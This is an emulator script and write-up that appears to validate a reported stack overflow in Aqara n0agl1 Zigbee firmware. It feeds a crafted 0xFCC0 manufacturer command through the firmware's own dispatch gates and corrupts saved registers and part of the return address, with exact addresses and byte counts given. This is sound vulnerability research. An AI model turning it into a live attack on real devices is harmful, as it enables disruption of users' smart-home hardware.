:name: ZB-04 Aqara n0agl1 — ZCL-DISPATCH-INJECTION reachability PoC (0xFCC0 mfg-cluster gate -> constrained stack-OOB SINK) [Series 1 / EFR32MG13 / Cortex-M4]
:description: Injects an ALREADY-DECRYPTED PLAINTEXT manufacturer-specific 0xFCC0 ZCL command (as a crafted EmberAfClusterCommand) at the firmware's mfg-cluster dispatch gate sub_B9DC and lets the real Aqara n0agl1 firmware's OWN code run the struct[0x15] path split, the clusterId classification switch, the clusterId==0xFCC0 comparison, and the mfg-command flag gate (*0x200059f4==1), TAIL-CALLING the vulnerable sink sub_5014. No PC is forced into the switch, the clusterId gate, the flag gate, or the sink: only the dispatch ENTRY sub_B9DC is entered with the register contract the RX/dispatch chain (sub_1E928 -> sub_1E524 -> sub_1D958 -> sub_B9DC) would set up. This closes two axes the function-level PoC (zb04_validate.resc, which forces PC=0x5014) skips: (1) GATE REACHABILITY (the firmware's own switch + clusterId==0xFCC0 + flag gate route the frame to sub_5014) and (2) PARAMETER FIDELITY (the attacker bufLen flows UNCLAMPED into the memmove count).
#
# ============================ RESULT (reproduced 2026-07-13, MG13/Cortex-M4) ============================
#   Marker order (NATURAL branches/calls of the firmware, no forced PC below the entry):
#       MARK_B9DC_ENTRY -> MARK_BA26_PATH2 -> MARK_BA3C_LOOKUP_OK -> MARK_BA82_CLUSTER_CMP
#       -> MARK_BA8A_FCC0_MATCH -> MARK_BA94_FLAG_OK -> MARK_5014_SINK_ENTRY
#       -> MARK_502A_MEMMOVE -> MARK_5042_POST_MEMMOVE
#     MARK_BA14_REJECT_MAIN / MARK_BA0E_REJECT_DEFAULT did NOT fire.
#   Constrained overflow, read at PC=0x5044 (one past the 0x5042 marker, after memmove, before epilogue):
#       0x2000EFB0 (buffer)   = 0xAAAAAAAA   payload written
#       0x2000EFF0 (saved R4) = 0xAAAAAAAA   fully overwritten
#       0x2000EFF4 (saved R5) = 0xAAAAAAAA   fully overwritten
#       0x2000EFF8 (saved R6) = 0xAAAAAAAA   fully overwritten
#       0x2000EFFC (saved LR) = 0xDEADBEAA   ONLY low byte (0xEF->0xAA) corrupted (constrained)
#   => The firmware's OWN mfg-cluster dispatch routed the injected 0xFCC0 frame through the
#      clusterId==0xFCC0 gate and the *0x200059f4==1 flag gate to sub_5014, and the attacker
#      bufLen (0x52) flowed UNCLAMPED into count=(uint16)(bufLen-5)=77, fully overwriting saved
#      R4/R5/R6 and the low byte of the saved return address. Bounded by the 82-byte reception
#      cap = constrained CFH/DoS (NOT full PC control), exactly as the report claims.
#
# ============================ FORCED vs NATURAL ============================
#   FORCED (emulation scaffolding, minimal):
#     * The plaintext EmberAfClusterCommand struct + APS/ZCL header stand-in + source buffer are
#       written into scratch RAM and the CPU is entered at sub_B9DC (0xB9DC) with r0 = &cmd
#       exactly as the dispatch chain would pass it. This deliberately BYPASSES NWK/APS
#       decryption, APS addressing/endpoint routing, and the ZCL-header decode that builds `cmd`
#       (models a joined device whose traffic has already been authenticated/decrypted).
#     * The mfg-command flag *0x200059f4 is pre-seeded = 1. sub_63c8 returns the constant base
#       0x200059d0 and sub_B9DC reads [base+0x24] = *0x200059f4; the gate at 0xba90 requires == 1.
#       This one device-state cell is a normal runtime flag, not a gate on attacker data.
#     * The endpoint/cluster-AFFINITY lookup sub_1bff6 is stubbed to `movs r0,#1; bx lr`.
#       WHY (verified, honest): sub_1bff6 -> sub_1bf7c scans the endpoint table whose count byte
#       *0x20003329 and base *0x200060f8 are BOTH 0x00000000 after a bare (non-joined) boot -- no
#       endpoints/clusters are registered -- so the lookup returns 0 and sub_B9DC rejects at 0xba3a
#       (branch to 0xba14). This is the SAME "endpoint/cluster affinity search ABOVE the command
#       dispatch" that the ZB-05 PoC documents as bypassed scaffolding; here it happens to sit
#       INSIDE sub_B9DC. The stub represents a device that HAS manufacturer cluster 0xFCC0
#       registered on the target endpoint (the real Aqara n0agl1 does). It does NOT touch the
#       attacker-controlled clusterId, the 0xFCC0 comparison, the flag gate, or any sink parameter.
#       ---> Without the stub the natural path is IDENTICAL up to MARK_BA26_PATH2, then rejects at
#            0xba3a (sub_1bff6 == 0) and returns to the caller. See "NATURAL-REJECT FINDING" below.
#   NATURAL (firmware's own execution, from sub_B9DC down -- NO forced PC):
#     * sub_B9DC reads cmd[0x15]; ==0 takes the "path 2" branch to 0xba26 (0xb9ee bne 0xba26).
#     * 0xba26 re-checks cmd[0x15]==0, calls sub_1bff6(dir=hdr[5], clusterId=hdr[2], mfgCode=cmd[0x10]).
#     * 0xba3c: reads clusterId = *(cmd[0] + 2) and runs the firmware's own clusterId switch;
#       0xFCC0 falls through the >0xa / >0x702 / !=0xb04 comparisons to 0xba82.
#     * 0xba82: movw r2,#0xFCC0 ; cmp clusterId,r2 ; 0xba88 bne 0xba14 (reject if != 0xFCC0).
#     * 0xba8a: bl sub_63c8 (returns 0x200059d0) ; ldr r3,[r0,#0x24] = *0x200059f4 ;
#       0xba90 cmp r3,#1 ; 0xba92 bne 0xba0e (reject if flag != 1).
#     * 0xba94: mov r0,cmd ; pop {r3,r4,r5,lr} ; 0xba9a b.w sub_5014 (TAIL-CALL, SP preserved).
#     * sub_5014: FIRST op is the unbounded copy. count=(uint16)(cmd[0xc]-cmd[0x14]) = 0x52-5 = 77;
#       dest = SP+0x10 (64-byte buffer); src = cmd[0x8]+cmd[0x14]; BL sub_C5F0 (memmove) @0x502a.
#       No clamp. push{r4,r5,r6,lr}+sub sp,#0x50 => saved R4/R5/R6 at buf[64/68/72], saved LR at
#       buf[76]; count 77 writes buf[0..76], fully overwriting R4/R5/R6 and the LOW BYTE of saved LR.
#
# ============================ ARG CONTRACT AT sub_B9DC (r0 = &cmd = EmberAfClusterCommand) ==========
#   cmd[0x00] = ptr to APS/ZCL header ; header[+2] (u16) = clusterId (gate: == 0xFCC0) ; header[+5] = dir
#   cmd[0x08] = source base ptr (sink src = cmd[0x08] + cmd[0x14])
#   cmd[0x0c] = bufLen (u16)  (sink count = (u16)(cmd[0x0c] - cmd[0x14]))
#   cmd[0x0f] = mfg-specific flag byte (only affects default status value)
#   cmd[0x10] = mfgCode (u16, -> sub_1bff6)      cmd[0x14] = payloadStartIndex byte (= 5)
#   cmd[0x15] = path selector byte (gate: == 0 -> the mfg 0xFCC0 path)
#
# ============================ STACK / SENTINEL MATH ============================
#   Entry SP (fresh) at sub_B9DC                 = 0x2000F000
#   sub_B9DC push{r3,r4,r5,lr} then pop before   -> SP back to 0x2000F000 (tail-call, no net change)
#   b.w sub_5014 -> sub_5014 push{r4,r5,r6,lr}    -> SP = 0x2000EFF0 ; sub sp,#0x50 -> SP = 0x2000EFA0
#   buffer = SP+0x10                              = 0x2000EFB0
#   saved R4 = 0x2000EFF0  saved R5 = 0x2000EFF4  saved R6 = 0x2000EFF8  saved LR = 0x2000EFFC
#   buf[64]=0x2000EFF0(=R4) ... buf[76]=0x2000EFFC(=LR low byte). count 77 => reaches saved-LR low byte.
#
# ============================ NATURAL-REJECT FINDING (honest dead-end, then bypassed) ==============
#   With sub_1bff6 NOT stubbed, a Step trace of the natural path is:
#       0xB9DC -> 0xBA26 (path2) -> 0x1BFFA (sub_1bff6) -> 0x1BF82 (sub_1bf7c endpoint scan)
#       -> returns 0 -> 0xba3a beq -> 0xba14 -> pop{...pc} -> LR sentinel 0xDEADBEEE (CPU abort).
#   EXACT check: 0xba38 `cmp r0,#0` / 0xba3a `beq 0xba14`. Wanted: sub_1bff6 != 0, i.e. the endpoint
#   table (count *0x20003329, base *0x200060f8 -- both 0 in a bare boot) must contain the target
#   endpoint with mfg cluster 0xFCC0. Satisfied on a real joined device; here supplied via the stub.
# =======================================================================================

using sysbus
emulation SetGlobalSerialExecution true
mach create "zb04"
machine LoadPlatformDescription @platforms/boards/silabs/brd4162a.repl
macro reset
"""
    sysbus LoadELF @scripts/silabs-vuln/zb04_aqara.elf
    cpu VectorTableOffset 0x4000
"""
runMacro $reset
logLevel 3

# COLD chain hooks (each executes once on this path -> no flooding).
cpu AddHook 0xb9dc "self.ErrorLog('MARK_B9DC_ENTRY')"
cpu AddHook 0xba26 "self.ErrorLog('MARK_BA26_PATH2')"
cpu AddHook 0xba3c "self.ErrorLog('MARK_BA3C_LOOKUP_OK')"
cpu AddHook 0xba82 "self.ErrorLog('MARK_BA82_CLUSTER_CMP')"
cpu AddHook 0xba8a "self.ErrorLog('MARK_BA8A_FCC0_MATCH')"
cpu AddHook 0xba94 "self.ErrorLog('MARK_BA94_FLAG_OK')"
cpu AddHook 0x5014 "self.ErrorLog('MARK_5014_SINK_ENTRY')"
cpu AddHook 0x502a "self.ErrorLog('MARK_502A_MEMMOVE')"
# reject-sentinel hooks (prove the gate PASSED naturally, not bypassed)
cpu AddHook 0xba14 "self.ErrorLog('MARK_BA14_REJECT_MAIN')"
cpu AddHook 0xba0e "self.ErrorLog('MARK_BA0E_REJECT_DEFAULT')"
# post-memmove observation point (marker only; we stop here via an exact Step count, because
# IsHalted set inside a hook is NOT honored mid-Step on this MG13 image, and running past this
# point lets the downstream 0xFCC0 handler sub_4cc8 re-copy and CLOBBER the sentinel slots).
cpu AddHook 0x5042 "self.ErrorLog('MARK_5042_POST_MEMMOVE')"

# Boot through clock/power/radio bring-up.
emulation RunFor "0.3"
pause
echo ">>> post-boot PC (expect advanced past reset vector):"
cpu PC

# --- FORCED: mfg-command flag gate (*0x200059f4 == 1, read via sub_63c8()[0x24]) ------
sysbus WriteDoubleWord 0x200059f4 0x00000001

# --- FORCED: stub the endpoint/cluster-affinity lookup sub_1bff6 -> `movs r0,#1; bx lr`
#     (no endpoints registered in a bare boot: *0x20003329==0; models a joined device that
#      implements mfg cluster 0xFCC0 -- see NATURAL-REJECT FINDING in the header).
sysbus WriteWord 0x1bff6 0x2001
sysbus WriteWord 0x1bff8 0x4770

# --- Crafted EmberAfClusterCommand `cmd` @0x2000A000 (r0 at sub_B9DC) -----------------
#   [0x00]=header ptr 0x2000A100  [0x08]=source base 0x2000B000  [0x0c]=bufLen 0x0052 (82)
#   [0x0f]=mfg flag 0  [0x10]=mfgCode 0x115F  [0x14]=payloadStartIndex 5  [0x15]=path selector 0
sysbus WriteDoubleWord 0x2000A000 0x2000A100
sysbus WriteDoubleWord 0x2000A008 0x2000B000
sysbus WriteDoubleWord 0x2000A00C 0x00000052
sysbus WriteDoubleWord 0x2000A010 0x0000115F
sysbus WriteByte 0x2000A014 0x05
sysbus WriteByte 0x2000A015 0x00
sysbus WriteByte 0x2000A00F 0x00

# --- APS/ZCL header stand-in @0x2000A100: [+2] (u16)=clusterId 0xFCC0  [+5]=direction 1 -----
sysbus WriteDoubleWord 0x2000A100 0xFCC00000
sysbus WriteByte 0x2000A105 0x01

# --- Source buffer: memmove reads 77 bytes from 0x2000B005. Fill 0xAA sentinel. -----------
sysbus WriteDoubleWord 0x2000B000 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B004 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B008 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B00C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B010 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B014 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B018 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B01C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B020 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B024 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B028 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B02C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B030 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B034 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B038 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B03C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B040 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B044 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B048 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B04C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B050 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B054 0xAAAAAAAA

# --- Register contract the dispatch chain hands sub_B9DC ------------------------------
#   r0 = &cmd    SP = fresh scratch stack    LR = 0xDEADBEEF sentinel (saved-LR fill)
sysbus.cpu SetRegister 13 0x2000F000
sysbus.cpu SetRegister 14 0xDEADBEEF
sysbus.cpu SetRegister 0  0x2000A000
sysbus.cpu PC 0xB9DC

echo ">>> BEFORE: saved R4/R5/R6/LR slots (0x2000EFF0/F4/F8/FC) ="
sysbus ReadDoubleWord 0x2000EFF0
sysbus ReadDoubleWord 0x2000EFF4
sysbus ReadDoubleWord 0x2000EFF8
sysbus ReadDoubleWord 0x2000EFFC

# Let the firmware's OWN dispatch carry the frame down. We drive it with Step (RunFor stalls
# on this MG13 image); the marker hooks fire during Step. Step count 345 lands EXACTLY at the
# post-memmove observation PC 0x5042 (0xB9DC entry -> b.w sub_5014 at step 45, +300 to 0x5042,
# same +300 the function-level recipe uses). MG13 MappedMemory writes bypass Renode watchpoints,
# so we OBSERVE by READING memory here (before the downstream handler can clobber the frame).
sysbus.cpu Step 346
echo ">>> observation PC (expect 0x5044 = one past the 0x5042 post-memmove marker):"
cpu PC

echo ">>> AFTER: PC ="
cpu PC
echo ">>> AFTER: buffer start @0x2000EFB0 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFB0
echo ">>> saved R4 @0x2000EFF0 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFF0
echo ">>> saved R5 @0x2000EFF4 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFF4
echo ">>> saved R6 @0x2000EFF8 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFF8
echo ">>> saved LR @0x2000EFFC (expect 0xDEADBEAA - one byte corrupted) ="
sysbus ReadDoubleWord 0x2000EFFC
echo ">>> (markers above: B9DC -> BA26 -> BA3C -> BA82 -> BA8A -> BA94 -> 5014 -> 502A -> 5042 = natural dispatch)"
quit
